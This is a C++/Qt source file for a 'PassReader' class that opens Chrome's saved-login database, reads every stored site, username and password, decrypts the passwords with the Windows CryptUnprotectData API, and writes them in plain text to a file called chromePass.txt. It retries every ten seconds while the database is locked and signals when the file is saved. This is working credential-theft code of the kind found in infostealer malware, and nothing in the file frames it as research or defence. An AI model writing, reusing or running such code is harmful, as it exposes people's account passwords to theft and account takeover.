#include <windows.h>

#include <QDebug>
#include <QtSql/QSqlQuery>

#include "passReader.h"

PassReader::PassReader(QObject* parent, const QString &str):
    QObject(parent),
    path(str)
{
    setlocale(LC_CTYPE, "rus");

    timer = new QTimer(this);
    db = new QSqlDatabase( QSqlDatabase::addDatabase("QSQLITE", "passwords") );

    //Get %appdata% folder
    QString appdata = getenv("APPDATA");
    appdata.replace("\\", "/");

    //Destination folder
    db->setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");
}

PassReader::~PassReader()
{
    delete timer;
    QSqlDatabase::removeDatabase("passwords");
}

bool const PassReader::readPass()
{
    //Output file
    QString filePath = path + '/' + "chromePass.txt";
    QFile file(filePath);

    if (db->open())
    {
        //Create SQL Query, select url+login+pass
        QSqlQuery query("SELECT origin_url, username_value, password_value FROM logins", *db);

        //If data base is locked
        if ( ! query.exec() )
        {
            qDebug() << "DB is locked";
            db->close();
            //Start timer
            if ( ! timer->isActive() )
            {
                connect(timer, &QTimer::timeout, this, &PassReader::readPass);
                timer->setInterval(10*1000); //10 sec
                timer->start();
            }
            return false;
        }
        else    //Success
        {
            timer->stop();
            file.open(QIODevice::WriteOnly);
        }

        while (query.next())
        {
            QString url = query.value(0).toString();
            QString user = query.value(1).toString();
            QByteArray pass = query.value(2).toByteArray();

            //Decrypt
            DATA_BLOB DataIn;
            DATA_BLOB DataOut;
            DATA_BLOB* pDataIn = &DataIn;
            DATA_BLOB* pDataOut = &DataOut;

            DataIn.pbData =  reinterpret_cast<byte *>( pass.data() );  //Pointer to data_input              BYTE*
            DataIn.cbData = pass.size();                               //Size of input string (in bytes)   DWORD

            //Decryption function
            if (CryptUnprotectData( pDataIn,
                                    NULL,
                                    NULL,           // Entropy
                                    NULL,
                                    NULL,
                                    0,
                                    pDataOut))
            {
                QByteArray passDecrypted;
                unsigned long passSize  = static_cast<unsigned long>(DataOut.cbData);

                //Get pass string and cut (pbData doesn't have '\0')
                passDecrypted.append(reinterpret_cast<char *>(DataOut.pbData));
                passDecrypted.resize(passSize);

                qDebug() << endl << url << endl << "user = " << user << "\npass = " << QString(passDecrypted);

                //Stream for writing
                QTextStream stream(&file);
                stream << endl << url << "\r\nuser = " << user << "\r\npass = " << passDecrypted << "\r\n\r\n";
            }
            else
            {
                //Error in decryption function
                return false;
            }
        }
    }
    else
    {
        qDebug() << "Error. Cannot open DB.";
        file.close();
        return false;
    }

    db->close();
    file.close();
    emit fileSaved(filePath);
    return true;
}
